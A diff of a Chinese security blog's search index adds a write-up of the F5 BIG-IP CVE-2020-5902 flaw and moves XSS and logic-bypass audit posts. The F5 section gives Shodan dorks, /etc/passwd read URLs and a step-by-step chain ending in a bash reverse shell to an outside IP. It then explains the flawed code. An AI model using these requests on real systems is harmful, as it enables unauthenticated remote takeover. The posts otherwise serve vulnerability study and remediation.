@@ -61,6 +61,45 @@
 ]]></content>
   </entry>
   <entry>
+    <title>CVE-2020-5902 F5 BIG-IP TMUI 远程代码执行漏洞</title>
+    <url>/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/</url>
+    <content><![CDATA[<p>2020年7月1日，F5官方发布了流量管理用户界面(TMUI)远程代码漏洞(CVE-2020-5902)安全通告，未经认证的攻击者，在可以访问TMUI界面的情况下，可对目标实现远程代码执行。</p>
+<p>受影响版本：</p>
+<p>BIG-IP  15.1.0, 15.0.0, 14.1.0-14.1.2, 13.1.0-13.1.3, 12.1.0-12.1.5, 11.6.1-11.6.5</p>
+<a id="more"></a>
+
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="资产发现"><a href="#资产发现" class="headerlink" title="资产发现"></a>资产发现</h2><p>shodan搜索语法</p>
+<p><code>http.favicon.hash:-335242539</code></p>
+<p><code>http.title:&quot;BIG-IP&amp;reg;- Redirect&quot;</code></p>
+<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/shodan-f5.png" alt="shodan-f5"></p>
+<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>文件读取：<code>https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code></p>
+<p>命令执行：<code>https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin</code></p>
+<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>1.开启bash<br><code>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash</code></p>
+<p>2.在可执行目录下创建文件并写入需要执行的命令<br><code>/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/123456&amp;content=bash+-i&gt;%26+/dev/tcp/172.16.1.1/2333+0&gt;%261</code></p>
+<p>3.命令执行<br><code>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp%2f123456</code></p>
+<p>4.还原list命令<br><code>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list</code></p>
+<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>在<a href="https://github.com/jas502n/CVE-2020-5902" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2020-5902</a> 中下载到所需文件的源码。</p>
+<h2 id="为什么要使用-tmui-login-jsp"><a href="#为什么要使用-tmui-login-jsp" class="headerlink" title="为什么要使用/tmui/login.jsp/..;/"></a>为什么要使用/tmui/login.jsp/..;/</h2><p>TMUI原本存在登录限制，使用/..;/是为了绕过登录限制。绕过登录限制是漏洞利用的基础，只有绕过了登录限制，才能无障碍进行后续步骤。</p>
+<p>登录限制之后的漏洞非常直接，通过代码审计可以很轻松的找到相应漏洞。</p>
+<h2 id="tmshCmd-jsp"><a href="#tmshCmd-jsp" class="headerlink" title="tmshCmd.jsp"></a>tmshCmd.jsp</h2><p>查看<code>tmshCmd_jsp.java</code>文件，在第110行调用<code>WorkspaceUtils.runTmshCommand</code>方法</p>
+<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/tmshCmd.png" alt="tmshCmd"></p>
+<p>追到<code>WorkspaceUtils.runTmshCommand</code>方法，第80行存在command的判断，会禁止一些BadShellCharacters。command会根据空格分成cmdArray数组，并且cmdArray第一个命令必须是<code>create</code>、<code>delete</code>、<code>list</code>、<code>modify</code>，第三个必须被包含在<code>WHITELISTED_TMSH_MODULES</code>中，最后在第83行调用<code>Syscall.callElevated</code>进行tmsh命令执行。</p>
+<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/WorkspaceUtils-runTmshCommand.png" alt="WorkspaceUtils-runTmshCommand"></p>
+<p>tmsh有自己一套的命令规则，参考<a href="https://clouddocs.f5.com/cli/tmsh-reference/latest/general/tmsh.html" target="_blank" rel="noopener">https://clouddocs.f5.com/cli/tmsh-reference/latest/general/tmsh.html</a> 和<a href="https://clouddocs.f5.com/api/tmsh/Commands.html" target="_blank" rel="noopener">https://clouddocs.f5.com/api/tmsh/Commands.html</a></p>
+<p>需配合一定的手法，才能进行代码执行。</p>
+<p>这就是为什么Exp中第一步需要执行<code>create cli alias private list command bash</code>命令的原因，将<code>list</code>别名为<code>bash</code>。所以第3步<code>list /tmp%2f123456</code>等效于<code>bash /tmp%2f123456</code>。</p>
+<h2 id="fileRead-jsp"><a href="#fileRead-jsp" class="headerlink" title="fileRead.jsp"></a>fileRead.jsp</h2><p><code>fileRead_jsp.java</code>中第101行判断fileName是否在文件白名单中，第105行判断当前用户是否有该文件访问权限。最后在109行调用<code>WorkspaceUtils.readFile</code></p>
+<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/fileRead.png" alt="fileRead"></p>
+<p>在<code>WorkspaceUtils.readFile</code>方法中直接读取文件并返回，因为使用<code>File</code>对象读取文件，所以可以读取任意文件。</p>
+<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/WorkspaceUtils-readFile.png" alt="WorkspaceUtils-readFile"></p>
+<h2 id="fileSave-jsp"><a href="#fileSave-jsp" class="headerlink" title="fileSave.jsp"></a>fileSave.jsp</h2><p><code>fileSave_jsp.java</code>和<code>fileRead_jsp.java</code>中一样，首先对文件进行白名单判断和权限判断，再调用<code>WorkspaceUtils.saveFile</code>方法。</p>
+<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/fileSave.png" alt="fileSave"></p>
+<p><code>WorkspaceUtils.saveFile</code>中第176-179行将传入的文件写入文件，导致可写任意文件漏洞。</p>
+<p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/WorkspaceUtils-saveFile.png" alt="WorkspaceUtils-saveFile"></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/jas502n/CVE-2020-5902" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2020-5902</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>CVE-2020-5405 Spring Cloud Config目录遍历漏洞绕过</title>
     <url>/2020/06/27/CVE-2020-5405_Spring_Cloud_Config_Directory_Traversal_Bypass/</url>
     <content><![CDATA[<p>该漏洞是CVE-2019-3799的绕过。</p>
@@ -498,6 +537,81 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Java SpringBoot框架代码审计四 - XSS</title>
+    <url>/2020/05/03/JavaSpringBootCodeAudit-4-XSS/</url>
+    <content><![CDATA[<p>XSS我们都知道是由于字符不过滤或过滤不完善导致的，也都知道修复方法。但是在程序中哪个位置进行字符过滤，是很多渗透测试人员不了解的。不了解字符过滤在程序中的所处的位置，是不能在代码审计中找到XSS的。</p>
+<a id="more"></a>
+
+<h1 id="XSS代码审计过程"><a href="#XSS代码审计过程" class="headerlink" title="XSS代码审计过程"></a>XSS代码审计过程</h1><p>我们先从开发者的视角来看，假设一个系统有100个可输入字符的功能点，现在我需要做XSS防护，那么我是不是要在这100个功能点前都做一遍XSS字符过滤呢？都做一遍的话开发可能得累死，而且每个功能点还需要重新进行测试，整个过程下来消耗大量的人力。</p>
+<p>就算一个一个功能点加完字符过滤，那以后项目有新需求，重新添加功能怎么办呢？又给每个功能添加XSS字符过滤？那别的工作还要不要做了。</p>
+<p>所以XSS修复并不是单独进行的，往往是通过Filter或者Interceptor来全局处理。Filter或Interceptor在请求进入Controller前，对请求内容进行处理。这样可以做到统一的字符处理，不用在每个功能点前单独对用户传入的字符进行XSS过滤。</p>
+<p>在代码审计中，找XSS漏洞第一件事是先判断程序中是否存在Filter或者Interceptor。</p>
+<p>一个理想的XSS流程处理的简略图如下，红色表示XSS payload未被转义，绿色表示已转义。</p>
+<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/payload-request-path.png" alt="payload-request-path" style="zoom:50%;">
+
+
+
+<p>回到项目结构中来，我们发现其中没有配置任何filter，只有interceptor（拦截器）。Filter和interceptor做的事很相似，但他们的触发时机不同，且interceptor只在Spring中生效，具体差别可以搜索引擎中搜索查看。</p>
+<p>在项目代码中查找发现不存在filter，只有三个interceptor，分别是：<code>AdminLoginInterceptor</code>、<code>NewBeeMallCartNumberInterceptor</code>、<code>NewBeeMallLoginInterceptor</code>。从文件名来判断就知道不存在XSS相关的拦截器。</p>
+<p>可以判断该应用程序中很可能存在XSS。</p>
+<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/do-not-exist-filter.png" alt="do-not-exist-filter" style="zoom:33%;">
+
+
+
+<p>我们先来实际测试一下XSS，在首页搜索框中输入XSS payload <code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-first-try.png" alt="xss-first-try"></p>
+<p>查看返回结果，咦奇怪，怎么XSS payload没有触发呢？</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-first-try-response.png" alt="xss-first-try-response"></p>
+<p>抓包看一下，确定是XSS payload中的<code>&quot;&lt;&gt;</code>被转义了</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/burp-xss-first-try.png" alt="burp-xss-first-try"></p>
+<p>我们下断点调试看一下，传进来的keyword确实是<code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code>，传入Web系统的过程中没有转义处理，那问题出在哪里呢？</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/debug-xss-first-try.png" alt="debug-xss-first-try"></p>
+<p>其实转义出现在输出到模版的过程中，系统使用了thymeleaf作为模版引擎，可以处理HTML，XML，JavaScript，CSS。thymeleaf有自己的XSS转义方法，thymeleaf模版在对<code>th:text</code>标签进行渲染的时候，默认对特殊字符进行了转义，所以我们输入的XSS payload是在输出时被转义的。</p>
+<p><code>/src/main/resources/templates/mall/search.html:33</code></p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/thymeleaf-transfer.png" alt="thymeleaf-transfer"></p>
+<p>此时XSS payload传递路径如下，红色表示XSS payload未被转义，绿色表示已转义。</p>
+<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-request-path.png" alt="xss-request-path" style="zoom:50%;">
+
+<p>弄明白XSS payload被转义的原理之后，我们可以转换思路：</p>
+<ol>
+<li>找thymeleaf未作转义的输出，<code>th:utext</code>不会将字符转义</li>
+</ol>
+<p>发现以下模版中存在<code>th:utext</code>，所以这两个功能点存在XSS。其中第二个，<code>detail.html</code>因为显示的是商品信息，商品信息使用富文本编辑器，不能简单的转义处理，需要考虑正常的html标签传输，所以作者在这里使用<code>th:utext</code>来显示商品详细。</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/search-not-transferred.png" alt="search-not-transferred"></p>
+<ol start="2">
+<li>找不经过thymeleaf的输出</li>
+</ol>
+<p>在后台，商品信息编辑中输入XSS payload，点击保存</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/not-through-thymeleaf.png" alt="not-through-thymeleaf"></p>
+<p>发现触发我们输入的XSS payload</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-exploit.png" alt="xss-exploit"></p>
+<p>我们可以抓包看一下，商品信息使用jqGrid传输，将返回的json显示到网页中，该过程没有对字符串进行转义，导致XSS漏洞产生。</p>
+<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/burp-xss-second-try.png" alt="burp-xss-second-try"></p>
+<p>除以上举例之外，系统还存在多处XSS，在此就不一一列举，大家有兴趣的话可以自己试着找找。 </p>
+<h1 id="XSS-修复"><a href="#XSS-修复" class="headerlink" title="XSS 修复"></a>XSS 修复</h1><p>预防存储型和反射型XSS的代码有两种常见方法：</p>
+<ol>
+<li>对HTML做充分转义</li>
+</ol>
+<p>转义一般在filter或interceptor中做，如何添加xss filter网上有很多资料可以参考，比如<a href="https://juejin.im/post/5d079e555188251ad81a28d9" target="_blank" rel="noopener">https://juejin.im/post/5d079e555188251ad81a28d9</a> ，就不在此赘述。</p>
+<p>XSS难以消灭其中一个因素是功能需求与转义相背，比如filter转义把json中的双引号转义导致json无法解析；富文本编辑器就不能转义正常用户所需的html标签，需要额外对允许输入的标签做一个白名单过滤；大于小于号的比较，输入<code>1&lt;2</code>，转义就变成了<code>1 &amp;lt; 2</code>导致功能失效等。</p>
+<p>修复过程中得结合考虑实际的业务场景。</p>
+<ol start="2">
+<li>改成纯前端渲染，避免直接输出html字符，把代码和数据完全分隔开，但是又需要注意DOM XSS的问题。</li>
+</ol>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>除了存储型和反射型XSS，还有DOM型XSS，因为它属于前端JavaScript的范畴，和后端Java代码没有关系，所以我没在本文中提及。</p>
+<p>HttpOnly属性：SpringBoot默认为会话cookie开启httponly，审计时检查是否存在<code>server.servlet.session.cookie.http-only</code>属性，如果存在的话检查其是否被改为false</p>
+<p>CSP：在响应头中添加<code>X-Content-Security-Policy</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebSecurityConfig</span> <span class="keyword">extends</span></span></span><br><span class="line"><span class="class">   <span class="title">WebSecurityConfigurerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    http</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      .headers()</span><br><span class="line">        .addHeaderWriter(<span class="keyword">new</span> StaticHeadersWriter(<span class="string">"X-Content-Security-Policy"</span>,<span class="string">"script-src 'self'"</span>))</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://tech.meituan.com/2018/09/27/fe-security.html" target="_blank" rel="noopener">https://tech.meituan.com/2018/09/27/fe-security.html</a></p>
+<p><a href="https://blog.csdn.net/heweimingming/article/details/79993591" target="_blank" rel="noopener">https://blog.csdn.net/heweimingming/article/details/79993591</a></p>
+<p><a href="https://juejin.im/entry/59bcdb34f265da06461884a4" target="_blank" rel="noopener">https://juejin.im/entry/59bcdb34f265da06461884a4</a></p>
+<p><a href="https://juejin.im/post/5d079e555188251ad81a28d9" target="_blank" rel="noopener">https://juejin.im/post/5d079e555188251ad81a28d9</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>Java SpringBoot框架代码审计五 - 越权</title>
     <url>/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/</url>
     <content><![CDATA[<p>越权分为三部分讲解：1. 未授权访问；2. 垂直越权；3. 水平越权</p>
@@ -610,81 +724,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Java SpringBoot框架代码审计四 - XSS</title>
-    <url>/2020/05/03/JavaSpringBootCodeAudit-4-XSS/</url>
-    <content><![CDATA[<p>XSS我们都知道是由于字符不过滤或过滤不完善导致的，也都知道修复方法。但是在程序中哪个位置进行字符过滤，是很多渗透测试人员不了解的。不了解字符过滤在程序中的所处的位置，是不能在代码审计中找到XSS的。</p>
-<a id="more"></a>
-
-<h1 id="XSS代码审计过程"><a href="#XSS代码审计过程" class="headerlink" title="XSS代码审计过程"></a>XSS代码审计过程</h1><p>我们先从开发者的视角来看，假设一个系统有100个可输入字符的功能点，现在我需要做XSS防护，那么我是不是要在这100个功能点前都做一遍XSS字符过滤呢？都做一遍的话开发可能得累死，而且每个功能点还需要重新进行测试，整个过程下来消耗大量的人力。</p>
-<p>就算一个一个功能点加完字符过滤，那以后项目有新需求，重新添加功能怎么办呢？又给每个功能添加XSS字符过滤？那别的工作还要不要做了。</p>
-<p>所以XSS修复并不是单独进行的，往往是通过Filter或者Interceptor来全局处理。Filter或Interceptor在请求进入Controller前，对请求内容进行处理。这样可以做到统一的字符处理，不用在每个功能点前单独对用户传入的字符进行XSS过滤。</p>
-<p>在代码审计中，找XSS漏洞第一件事是先判断程序中是否存在Filter或者Interceptor。</p>
-<p>一个理想的XSS流程处理的简略图如下，红色表示XSS payload未被转义，绿色表示已转义。</p>
-<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/payload-request-path.png" alt="payload-request-path" style="zoom:50%;">
-
-
-
-<p>回到项目结构中来，我们发现其中没有配置任何filter，只有interceptor（拦截器）。Filter和interceptor做的事很相似，但他们的触发时机不同，且interceptor只在Spring中生效，具体差别可以搜索引擎中搜索查看。</p>
-<p>在项目代码中查找发现不存在filter，只有三个interceptor，分别是：<code>AdminLoginInterceptor</code>、<code>NewBeeMallCartNumberInterceptor</code>、<code>NewBeeMallLoginInterceptor</code>。从文件名来判断就知道不存在XSS相关的拦截器。</p>
-<p>可以判断该应用程序中很可能存在XSS。</p>
-<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/do-not-exist-filter.png" alt="do-not-exist-filter" style="zoom:33%;">
-
-
-
-<p>我们先来实际测试一下XSS，在首页搜索框中输入XSS payload <code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-first-try.png" alt="xss-first-try"></p>
-<p>查看返回结果，咦奇怪，怎么XSS payload没有触发呢？</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-first-try-response.png" alt="xss-first-try-response"></p>
-<p>抓包看一下，确定是XSS payload中的<code>&quot;&lt;&gt;</code>被转义了</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/burp-xss-first-try.png" alt="burp-xss-first-try"></p>
-<p>我们下断点调试看一下，传进来的keyword确实是<code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code>，传入Web系统的过程中没有转义处理，那问题出在哪里呢？</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/debug-xss-first-try.png" alt="debug-xss-first-try"></p>
-<p>其实转义出现在输出到模版的过程中，系统使用了thymeleaf作为模版引擎，可以处理HTML，XML，JavaScript，CSS。thymeleaf有自己的XSS转义方法，thymeleaf模版在对<code>th:text</code>标签进行渲染的时候，默认对特殊字符进行了转义，所以我们输入的XSS payload是在输出时被转义的。</p>
-<p><code>/src/main/resources/templates/mall/search.html:33</code></p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/thymeleaf-transfer.png" alt="thymeleaf-transfer"></p>
-<p>此时XSS payload传递路径如下，红色表示XSS payload未被转义，绿色表示已转义。</p>
-<img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-request-path.png" alt="xss-request-path" style="zoom:50%;">
-
-<p>弄明白XSS payload被转义的原理之后，我们可以转换思路：</p>
-<ol>
-<li>找thymeleaf未作转义的输出，<code>th:utext</code>不会将字符转义</li>
-</ol>
-<p>发现以下模版中存在<code>th:utext</code>，所以这两个功能点存在XSS。其中第二个，<code>detail.html</code>因为显示的是商品信息，商品信息使用富文本编辑器，不能简单的转义处理，需要考虑正常的html标签传输，所以作者在这里使用<code>th:utext</code>来显示商品详细。</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/search-not-transferred.png" alt="search-not-transferred"></p>
-<ol start="2">
-<li>找不经过thymeleaf的输出</li>
-</ol>
-<p>在后台，商品信息编辑中输入XSS payload，点击保存</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/not-through-thymeleaf.png" alt="not-through-thymeleaf"></p>
-<p>发现触发我们输入的XSS payload</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/xss-exploit.png" alt="xss-exploit"></p>
-<p>我们可以抓包看一下，商品信息使用jqGrid传输，将返回的json显示到网页中，该过程没有对字符串进行转义，导致XSS漏洞产生。</p>
-<p><img src="/2020/05/03/JavaSpringBootCodeAudit-4-XSS/burp-xss-second-try.png" alt="burp-xss-second-try"></p>
-<p>除以上举例之外，系统还存在多处XSS，在此就不一一列举，大家有兴趣的话可以自己试着找找。 </p>
-<h1 id="XSS-修复"><a href="#XSS-修复" class="headerlink" title="XSS 修复"></a>XSS 修复</h1><p>预防存储型和反射型XSS的代码有两种常见方法：</p>
-<ol>
-<li>对HTML做充分转义</li>
-</ol>
-<p>转义一般在filter或interceptor中做，如何添加xss filter网上有很多资料可以参考，比如<a href="https://juejin.im/post/5d079e555188251ad81a28d9" target="_blank" rel="noopener">https://juejin.im/post/5d079e555188251ad81a28d9</a> ，就不在此赘述。</p>
-<p>XSS难以消灭其中一个因素是功能需求与转义相背，比如filter转义把json中的双引号转义导致json无法解析；富文本编辑器就不能转义正常用户所需的html标签，需要额外对允许输入的标签做一个白名单过滤；大于小于号的比较，输入<code>1&lt;2</code>，转义就变成了<code>1 &amp;lt; 2</code>导致功能失效等。</p>
-<p>修复过程中得结合考虑实际的业务场景。</p>
-<ol start="2">
-<li>改成纯前端渲染，避免直接输出html字符，把代码和数据完全分隔开，但是又需要注意DOM XSS的问题。</li>
-</ol>
-<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>除了存储型和反射型XSS，还有DOM型XSS，因为它属于前端JavaScript的范畴，和后端Java代码没有关系，所以我没在本文中提及。</p>
-<p>HttpOnly属性：SpringBoot默认为会话cookie开启httponly，审计时检查是否存在<code>server.servlet.session.cookie.http-only</code>属性，如果存在的话检查其是否被改为false</p>
-<p>CSP：在响应头中添加<code>X-Content-Security-Policy</code></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebSecurityConfig</span> <span class="keyword">extends</span></span></span><br><span class="line"><span class="class">   <span class="title">WebSecurityConfigurerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    http</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      .headers()</span><br><span class="line">        .addHeaderWriter(<span class="keyword">new</span> StaticHeadersWriter(<span class="string">"X-Content-Security-Policy"</span>,<span class="string">"script-src 'self'"</span>))</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://tech.meituan.com/2018/09/27/fe-security.html" target="_blank" rel="noopener">https://tech.meituan.com/2018/09/27/fe-security.html</a></p>
-<p><a href="https://blog.csdn.net/heweimingming/article/details/79993591" target="_blank" rel="noopener">https://blog.csdn.net/heweimingming/article/details/79993591</a></p>
-<p><a href="https://juejin.im/entry/59bcdb34f265da06461884a4" target="_blank" rel="noopener">https://juejin.im/entry/59bcdb34f265da06461884a4</a></p>
-<p><a href="https://juejin.im/post/5d079e555188251ad81a28d9" target="_blank" rel="noopener">https://juejin.im/post/5d079e555188251ad81a28d9</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>Java SpringBoot框架代码审计六 - CSRF</title>
     <url>/2020/05/05/JavaSpringBootCodeAudit-6-CSRF/</url>
     <content><![CDATA[<p>CSRF真正和代码相关的内容不太多，主要还是看过滤器和拦截器。代码审计中的思路是检查是否校验Referer、是否给cookie设置SameSite属性和敏感操作是否会生成CSRF token，如果都不存在再查看请求参数中是否存在不可被攻击者猜测的字段，比如验证码等参数。</p>
@@ -736,32 +775,6 @@
 <p><a href="https://blog.csdn.net/junmoxi/article/details/89208311" target="_blank" rel="noopener">https://blog.csdn.net/junmoxi/article/details/89208311</a></p>
 <p><a href="https://www.cnblogs.com/volcano-liu/p/11301057.html" target="_blank" rel="noopener">https://www.cnblogs.com/volcano-liu/p/11301057.html</a></p>
 <p><a href="https://stackoverflow.com/questions/42998367/same-site-cookie-in-spring-security/43250133#43250133" target="_blank" rel="noopener">https://stackoverflow.com/questions/42998367/same-site-cookie-in-spring-security/43250133#43250133</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Java SpringBoot框架代码审计七 - 逻辑漏洞</title>
-    <url>/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/</url>
-    <content><![CDATA[<p>逻辑漏洞不像之前介绍的漏洞有一套固定的审计流程，每个逻辑漏洞背后的代码都不一样。通过纯白盒去找逻辑漏洞是比较费劲的，首先需要彻底了解业务，再带着各种疑问和奇怪的想法去审。</p>
-<a id="more"></a>
-
-<h1 id="逻辑漏洞代码审计过程"><a href="#逻辑漏洞代码审计过程" class="headerlink" title="逻辑漏洞代码审计过程"></a>逻辑漏洞代码审计过程</h1><p>用户正常的购物过程是<code>添加购物车-&gt;下单-&gt;付款-&gt;出库-&gt;交易成功</code>，但程序在购物过程中没有对前一步进行校验。下订单但未支付时，访问<code>/orders/{orderNo}/finish</code>可直接完成交易。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /src/main/java/ltd/newbee/mall/controller/mall/OrderController.java</span></span><br><span class="line"><span class="meta">@PutMapping</span>(<span class="string">"/orders/&#123;orderNo&#125;/finish"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Result <span class="title">finishOrder</span><span class="params">(@PathVariable(<span class="string">"orderNo"</span>)</span> String orderNo, HttpSession httpSession) </span>&#123;</span><br><span class="line">    NewBeeMallUserVO user = (NewBeeMallUserVO) httpSession.getAttribute(Constants.MALL_USER_SESSION_KEY);</span><br><span class="line">    String finishOrderResult = newBeeMallOrderService.finishOrder(orderNo, user.getUserId());</span><br><span class="line">    <span class="keyword">if</span> (ServiceResultEnum.SUCCESS.getResult().equals(finishOrderResult)) &#123;</span><br><span class="line">        <span class="keyword">return</span> ResultGenerator.genSuccessResult();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ResultGenerator.genFailResult(finishOrderResult);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>从代码中可以看到直接调用<code>newBeeMallOrderService.finishOrder(orderNo, user.getUserId())</code>，对于该订单是否支付，是否出库等过程都没有校验。</p>
-<h1 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h1><p>随便添加一件物品到购物车，提交订单</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/submit-order.png" alt="submit-order"></p>
-<p>此时来到订单详情页面，按正常逻辑来下一步是付款操作</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/pay-order.png" alt="pay-order"></p>
-<p>在管理页面确认该订单当前状态是待支付</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/wait-for-payment.png" alt="wait-for-payment"></p>
-<p>使用PUT方法访问<code>http://localhost:8089/orders/15886680589866584/finish</code>即可直接完成订单</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/bypass-pay-order.png" alt="bypass-pay-order"></p>
-<p>因为代码使用的是<code>@PutMapping</code>，所以只能使用PUT方法访问，其他请求方法不会被执行</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/finishOrder.png" alt="finishOrder"></p>
-<p>再次查看订单，已经交易成功</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/paid-success.png" alt="paid-success"></p>
-<p>在管理页面查看该订单，证明交易成功。</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/show-orders.png" alt="show-orders"></p>
 ]]></content>
   </entry>
   <entry>
@@ -830,7 +843,7 @@
 <p>但是仅能读取web目录下的文件，不能读取系统其他文件。尝试读取web目录外的文件时产生如下报错：<code>Check that the corresponding file exists within your web application archive!</code></p>
 <p><img src="/2020/06/13/Spring_ModelAndView_Injection/500_error.png" alt="500_error"></p>
 <p>除了文件读取，当然也能进行一些权限认证的绕过，这需要考虑具体的代码场景，不一定通用。</p>
-<p>不过在实际代码中多了<code>RedirectView()</code>方法变成以下情形：</p>
+<p>不过实际项目代码中多了<code>RedirectView()</code>方法变成以下情形：</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ModelAndViewTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@GetMapping</span>(<span class="string">"/menuitem"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> ModelAndView <span class="title">menuitem</span><span class="params">(@RequestParam(value = <span class="string">"url"</span>)</span>String url) </span>&#123;</span><br><span class="line">		String nextUrl = url;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(<span class="keyword">new</span> RedirectView(url));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
